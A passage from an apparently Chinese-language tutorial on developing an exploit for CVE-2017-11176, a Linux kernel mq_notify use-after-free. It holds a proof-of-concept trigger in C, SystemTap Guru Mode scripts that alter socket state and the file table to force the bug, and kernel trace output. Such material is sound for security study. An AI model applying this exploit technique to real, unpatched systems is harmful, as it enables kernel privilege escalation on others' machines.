<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct sock *<span class="title">netlink_getsockbyfilp</span><span class="params">(struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> = <span class="title">filp</span>-&gt;<span class="title">f_path</span>.<span class="title">dentry</span>-&gt;<span class="title">d_inode</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!S_ISSOCK(inode-&gt;i_mode))         <span class="comment">// &lt;--- this need to be a socket...</span></span><br><span class="line">    <span class="keyword">return</span> ERR_PTR(-ENOTSOCK);</span><br><span class="line"></span><br><span class="line">  sock = SOCKET_I(inode)-&gt;sk;</span><br><span class="line">  <span class="keyword">if</span> (sock-&gt;sk_family != AF_NETLINK)    <span class="comment">// &lt;--- ...from the AF_NETLINK family</span></span><br><span class="line">    <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">  sock_hold(sock);</span><br><span class="line">  <span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp改为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * CVE-2017-11176 Exploit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTIFY_COOKIE_LEN (32)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">sigev</span>;</span></span><br><span class="line">    <span class="keyword">char</span> sival_buffer[NOTIFY_COOKIE_LEN];</span><br><span class="line">    <span class="keyword">int</span> sock_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-=&#123; CVE-2017-11176 Exploit &#125;=-\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;netlink socket created = %d\n&quot;</span>, sock_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialize the sigevent structure</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sigev, <span class="number">0</span>, <span class="keyword">sizeof</span>(sigev));</span><br><span class="line">    sigev.sigev_notify = SIGEV_THREAD;</span><br><span class="line">    sigev.sigev_value.sival_ptr = sival_buffer;</span><br><span class="line">    sigev.sigev_signo = sock_fd;  <span class="comment">// &lt;--- not &#x27;-1&#x27; anymore</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_mq_notify((<span class="keyword">mqd_t</span>)<span class="number">-1</span>, &amp;sigev))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;mq_notify&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mq_notify succeed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> exploit</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;exploit failed!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(3566-3566) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffebfc52b20)</span><br><span class="line">(3566-3566) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3566-3566) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(3566-3566) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3566-3566) &gt;&gt;&gt; skb_put (skb=0xffff88003afcd700 len=0x20)</span><br><span class="line">(3566-3566) &lt;&lt;&lt; skb_put = ffff88003afc8000</span><br><span class="line">(3566-3566) &gt;&gt;&gt; fdget (fd=?)</span><br><span class="line">(3566-3566) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003c7abc00)</span><br><span class="line">(3566-3566) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003c7ac800     &lt;==== Pass</span><br><span class="line">(3566-3566) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003c7ac800 skb=0xffff88003afcd700 timeo=0xffff88003c643f08 ssk=0x0)</span><br><span class="line">(3566-3566) &lt;&lt;&lt; netlink_attachskb = 0         &lt;==== Unwanted behavior</span><br><span class="line">(3566-3566) &gt;&gt;&gt; fdget (fd=?)</span><br><span class="line">(3566-3566) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003c7ac800 skb=0xffff88003afcd700)</span><br><span class="line">(3566-3566) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">(3566-3566) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>

<p><code>fget()</code>和<code>netlink_getsockbyfilp()</code>看起来都正常执行，且我们可以控制关键数据并到达<code>netlink_attachskb()</code>处。</p>
<h4 id="强制netlink-attachskb-进入retry"><a href="#强制netlink-attachskb-进入retry" class="headerlink" title="强制netlink_attachskb()进入retry"></a>强制netlink_attachskb()进入retry</h4><p>在前面的exp中，我们可以到达<code>netlink_attachskb()</code>但它返回了0，使得代码运行了非我们所愿的<code>normal</code>路径。回头看一下内核代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">netlink_attachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">long</span> *timeo, struct sock *ssk)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line"></span><br><span class="line">      nlk = nlk_sk(sk);</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &#123;</span><br><span class="line">        DECLARE_WAITQUEUE(wait, current);</span><br><span class="line">        <span class="keyword">if</span> (!*timeo) &#123;</span><br><span class="line">          <span class="comment">// ... cut (never reached in our code path) ...</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        __set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">        add_wait_queue(&amp;nlk-&gt;wait, &amp;wait);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &amp;&amp;</span><br><span class="line">            !sock_flag(sk, SOCK_DEAD))</span><br><span class="line">          *timeo = schedule_timeout(*timeo);</span><br><span class="line"></span><br><span class="line">        __set_current_state(TASK_RUNNING);</span><br><span class="line">        remove_wait_queue(&amp;nlk-&gt;wait, &amp;wait);</span><br><span class="line">        sock_put(sk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">          kfree_skb(skb);</span><br><span class="line">          <span class="keyword">return</span> sock_intr_errno(*timeo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;                             <span class="comment">// &lt;---- the only way</span></span><br><span class="line">      &#125;</span><br><span class="line">      skb_set_owner_r(skb, sk);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>想让<code>netlink_attachskb()</code>返回1只有一条途径，并且首先需要满足[0]处的判断：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state))</span><br></pre></td></tr></table></figure>

<p>为了强行满足该条件，就需要使用SystemTap的Guru Mode。在Guru Mode下，可以让我们的探针去调用我们所编写的代码，就如同直接向内核中注入代码一样。因此任何错误都会导致内核崩溃。</p>
<p>我们接下来要做的就是修改<code>sock</code>结构体<code>sk</code>和<code>netlink_sock</code>结构体<code>nlk</code>来使得if判断为True，在此之前，先收集一些<code>sk</code>的信息：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/sock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/netlink_sock.h&gt;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">function dump_netlink_sock:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">&quot;-=&#123; dump_netlink_sock: %p &#125;=-\n&quot;</span>, nlk);</span><br><span class="line">  _stp_printf(<span class="string">&quot;- sk = %p\n&quot;</span>, sk);</span><br><span class="line">  _stp_printf(<span class="string">&quot;- sk-&gt;sk_rmem_alloc = %d\n&quot;</span>, sk-&gt;sk_rmem_alloc);</span><br><span class="line">  _stp_printf(<span class="string">&quot;- sk-&gt;sk_rcvbuf = %d\n&quot;</span>, sk-&gt;sk_rcvbuf);</span><br><span class="line">  _stp_printf(<span class="string">&quot;- sk-&gt;sk_refcnt = %d\n&quot;</span>, sk-&gt;sk_refcnt);</span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">&quot;- nlk-&gt;state = %x\n&quot;</span>, (nlk-&gt;state &amp; <span class="number">0x1</span>));</span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">&quot;-=&#123; dump_netlink_sock: END&#125;=-\n&quot;</span>);</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">probe kernel.function (<span class="string">&quot;netlink_attachskb&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) [netlink] ==&gt;&gt; netlink_attachskb (%s)\n&quot;</span>, pid(), tid(), $$parms)</span><br><span class="line"></span><br><span class="line">    dump_netlink_sock($sk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用-g选项加载stap脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(3299-3299) &gt;&gt;&gt; mq_notify (4294967295, 0x7fff6bb3ac10)</span><br><span class="line">(3299-3299) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3299-3299) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(3299-3299) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3299-3299) &gt;&gt;&gt; skb_put (skb=0xffff88003d464d00 len=0x20)</span><br><span class="line">(3299-3299) &lt;&lt;&lt; skb_put = ffff88003add2000</span><br><span class="line">(3299-3299) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(3299-3299) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88001b895900)</span><br><span class="line">(3299-3299) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88001b875000</span><br><span class="line">(3299-3299) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88001b875000 skb=0xffff88003d464d00 timeo=0xffff880000053f08 ssk=0x0)</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88001b875000 &#125;=-</span><br><span class="line">- sk = 0xffff88001b875000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 2</span><br><span class="line">- nlk-&gt;state = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(3299-3299) &lt;&lt;&lt; netlink_attachskb = 0</span><br><span class="line">(3299-3299) &gt;&gt;&gt; __fdget (fd=0xffffffff)</span><br><span class="line">(3299-3299) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88001b875000 skb=0xffff88003d464d00)</span><br><span class="line">(3299-3299) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">(3299-3299) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>

<p>如上述输出，<em>nlk-&gt;state</em>的第1bit为0且<em>sk-&gt;sk_rmem_alloc</em>小于<em>sk-&gt;rcvbuf</em>，所以if判断不会成立。接着，让我们在<code>netlink_attachskb()</code>调用之前修改数据：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">function dump_netlink_sock:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">&quot;-=&#123; dump_netlink_sock: %p &#125;=-\n&quot;</span>, nlk);</span><br><span class="line">  _stp_printf(<span class="string">&quot;- sk = %p\n&quot;</span>, sk);</span><br><span class="line">  _stp_printf(<span class="string">&quot;- sk-&gt;sk_rmem_alloc = %d\n&quot;</span>, sk-&gt;sk_rmem_alloc);</span><br><span class="line">  _stp_printf(<span class="string">&quot;- sk-&gt;sk_rcvbuf = %d\n&quot;</span>, sk-&gt;sk_rcvbuf);</span><br><span class="line">  _stp_printf(<span class="string">&quot;- sk-&gt;sk_refcnt = %d\n&quot;</span>, sk-&gt;sk_refcnt);</span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">&quot;- (before) nlk-&gt;state = %x\n&quot;</span>, (nlk-&gt;state &amp; <span class="number">0x1</span>));</span><br><span class="line">  nlk-&gt;state |= <span class="number">1</span>;    <span class="comment">// &lt;-----</span></span><br><span class="line">  _stp_printf(<span class="string">&quot;- (after) nlk-&gt;state = %x\n&quot;</span>, (nlk-&gt;state &amp; <span class="number">0x1</span>));</span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">&quot;-=&#123; dump_netlink_sock: END&#125;=-\n&quot;</span>);</span><br><span class="line">%&#125;</span><br></pre></td></tr></table></figure>

<p>再次运行exp：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(3629-3629) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffc1507a6c0)</span><br><span class="line">(3629-3629) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3629-3629) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(3629-3629) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3629-3629) &gt;&gt;&gt; skb_put (skb=0xffff88003aec7c00 len=0x20)</span><br><span class="line">(3629-3629) &lt;&lt;&lt; skb_put = ffff88003ac79e00</span><br><span class="line">(3629-3629) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(3629-3629) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003ae67b00)</span><br><span class="line">(3629-3629) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003bdf9000</span><br><span class="line">(3629-3629) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003bdf9000 skb=0xffff88003aec7c00 timeo=0xffff88003cb37f08 ssk=0x0)</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88003bdf9000 &#125;=-</span><br><span class="line">- sk = 0xffff88003bdf9000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 2</span><br><span class="line">- nlk-&gt;state = 0</span><br><span class="line">- (after) nlk-&gt;state = 1</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(3629-3629) &lt;&lt;&lt; netlink_attachskb = fffffffffffffe00</span><br><span class="line">(3629-3629) &lt;&lt;&lt; mq_notify = fffffffffffffe00</span><br></pre></td></tr></table></figure>

<p>在运行的过程中，exp会卡在系统调用中，CTRL-C即可。注意到<code>netlink_attachskb()</code>返回了0xfffffffffffffe00(-ERESTARTSYS)，代表我们进入了如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">    kfree_skb(skb);</span><br><span class="line">    <span class="keyword">return</span> sock_intr_errno(*timeo); <span class="comment">// &lt;---- return -ERESTARTSYS</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这代表着我们成功地让<code>netlink_attachskb()</code>进入了其他路径。</p>
<h4 id="避免exploit阻塞"><a href="#避免exploit阻塞" class="headerlink" title="避免exploit阻塞"></a>避免exploit阻塞</h4><p><code>mq_notify()</code>阻塞的原因：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &amp;&amp;</span><br><span class="line">    !sock_flag(sk, SOCK_DEAD))</span><br><span class="line">    *timeo = schedule_timeout(*timeo);</span><br><span class="line"></span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br></pre></td></tr></table></figure>

<p>在第二章中我们会更深入的了解<em>scheduling</em>，现在主要是考虑为什么我们的exp会满足特定的条件并被阻塞。为了避免被阻塞，首先需要绕过<code>schedule_timeout()</code>，因此设置SOCK_DEAD，就是去修改<code>sk</code>的内容来让<code>sock_flag()</code>返回True：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from [include/net/sock.h]</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">sock_flag</span><span class="params">(<span class="keyword">const</span> struct sock *sk, <span class="keyword">enum</span> sock_flags flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> test_bit(flag, &amp;sk-&gt;sk_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> sock_flags &#123;</span><br><span class="line">  SOCK_DEAD,      <span class="comment">// &lt;---- this has to be &#x27;0&#x27;, but we can check it with stap!</span></span><br><span class="line">  ... cut ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编辑stap脚本：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mark it congested!</span></span><br><span class="line">_stp_printf(<span class="string">&quot;- (before) nlk-&gt;state = %x\n&quot;</span>, (nlk-&gt;state &amp; <span class="number">0x1</span>));</span><br><span class="line">nlk-&gt;state |= <span class="number">1</span>;            </span><br><span class="line">_stp_printf(<span class="string">&quot;- (after) nlk-&gt;state = %x\n&quot;</span>, (nlk-&gt;state &amp; <span class="number">0x1</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// mark it DEAD</span></span><br><span class="line">_stp_printf(<span class="string">&quot;- sk-&gt;sk_flags = %x\n&quot;</span>, sk-&gt;sk_flags);</span><br><span class="line">_stp_printf(<span class="string">&quot;- SOCK_DEAD = %x\n&quot;</span>, SOCK_DEAD);</span><br><span class="line">sk-&gt;sk_flags |= (<span class="number">1</span> &lt;&lt; SOCK_DEAD);</span><br><span class="line">_stp_printf(<span class="string">&quot;- sk-&gt;sk_flags = %x\n&quot;</span>, sk-&gt;sk_flags);</span><br></pre></td></tr></table></figure>

<p>重新运行脚本会发现exp陷入了内核的死循环中，原因是：</p>
<ul>
<li>内核进入了<code>netlink_attachskb()</code>并被我们强制执行到<code>retry</code></li>
<li>the thread is not scheduled (we by-passed it)</li>
<li><code>netlink_attachskb()</code>返回1</li>
<li>返回到<code>mq_notify()</code>后，再次执行goto retry</li>
<li><code>fget()</code>返回非NULL</li>
<li>再次进入<code>netlink_getsockbyfilp()</code></li>
<li>再次进入<code>netlink_attachskb()</code>并不断循环</li>
</ul>
<p>虽然我们绕过了阻塞，但是进入了死循环当中。</p>
<h4 id="停止死循环"><a href="#停止死循环" class="headerlink" title="停止死循环"></a>停止死循环</h4><p>首先让第二个<code>fget()</code>失败，做法是直接将fd从FDT中移除（设置成NULL）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  %&#123;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fdtable.h&gt;</span></span></span><br><span class="line">  %&#125;</span><br><span class="line"></span><br><span class="line">function remove_fd3_from_fdt:<span class="keyword">long</span> (arg_unused:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">NULL</span>;</span></span><br><span class="line">	   <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">NULL</span>;</span></span><br><span class="line">	_stp_printf(<span class="string">&quot;!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!\n&quot;</span>);</span><br><span class="line">	files = current-&gt;files;</span><br><span class="line">	fdt = files_fdtable(files);</span><br><span class="line">	fdt-&gt;fd[<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">  probe kernel.function (<span class="string">&quot;netlink_attachskb&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (execname() == <span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) [netlink] ==&gt;&gt; netlink_attachskb (%s)\n&quot;</span>, pid(), tid(), $$parms)</span><br><span class="line"></span><br><span class="line">      dump_netlink_sock($sk); <span class="comment">// it also marks the socket as DEAD and CONGESTED</span></span><br><span class="line">      remove_fd3_from_fdt(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>执行exp：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(5089-5089) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffe27114170)</span><br><span class="line">(5089-5089) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5089-5089) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(5089-5089) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5089-5089) &gt;&gt;&gt; skb_put (skb=0xffff88003aeef000 len=0x20)</span><br><span class="line">(5089-5089) &lt;&lt;&lt; skb_put = ffff88003d838600</span><br><span class="line">(5089-5089) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5089-5089) &lt;&lt;&lt; __fdget = ffff88000793ba00</span><br><span class="line">(5089-5089) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88000793ba00)</span><br><span class="line">(5089-5089) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003a2ed800</span><br><span class="line">(5089-5089) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003a2ed800 skb=0xffff88003aeef000 timeo=0xffff88003a32bf08 ssk=0x0)</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88003a2ed800 &#125;=-</span><br><span class="line">- sk = 0xffff88003a2ed800</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 2</span><br><span class="line">- (before) nlk-&gt;state = 0</span><br><span class="line">- (after) nlk-&gt;state = 1</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">- sk-&gt;sk_flags = 101</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!</span><br><span class="line">(5089-5089) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(5089-5089) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5089-5089) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(5089-5089) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003a2ed800 skb=0xffff88003aeef000)</span><br><span class="line">(5089-5089) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">(5089-5089) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>

<p>内核从之前的无限循环中跳出并且我们越来越接近攻击场景：</p>
<ol>
<li><code>netlink_attachskb()</code>返回1</li>
<li>第二次<code>fget()</code>返回NULL</li>
</ol>
<p>所以，我们触发了漏洞吗？</p>
<h4 id="查看refcounter"><a href="#查看refcounter" class="headerlink" title="查看refcounter"></a>查看refcounter</h4><p>一切都按照着我们的计划进行，因此漏洞也应该被触发使得<code>sock</code>的<code>refcounter</code>被减少了两次。在return的probe中，是无法使用enter的probe中的调用参数的，这意味着当<code>netlnk_attachskb()</code>返回时，我们无法检查<code>sock</code>的内容。</p>
<p>一种解决方法是将<code>netlink_getsockbyfilp()</code>返回的<code>sock</code>指针保存在全局变量中，然后再进行输出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">global sock_ptr = <span class="number">0</span>;                  <span class="comment">// &lt;------ declared globally!</span></span><br><span class="line"></span><br><span class="line">probe syscall.mq_notify.<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (sock_ptr != <span class="number">0</span>)                <span class="comment">// &lt;----- watch your NULL-deref, this is kernel-land!</span></span><br><span class="line">    &#123;</span><br><span class="line">      dump_netlink_sock(sock_ptr);</span><br><span class="line">      sock_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) [SYSCALL] &lt;&lt;== mq_notify= %d\n\n&quot;</span>, pid(), tid(), $<span class="keyword">return</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe kernel.function (<span class="string">&quot;netlink_getsockbyfilp&quot;</span>).<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) [netlink] &lt;&lt;== netlink_getsockbyfilp = %x\n&quot;</span>, pid(), tid(), $<span class="keyword">return</span>)</span><br><span 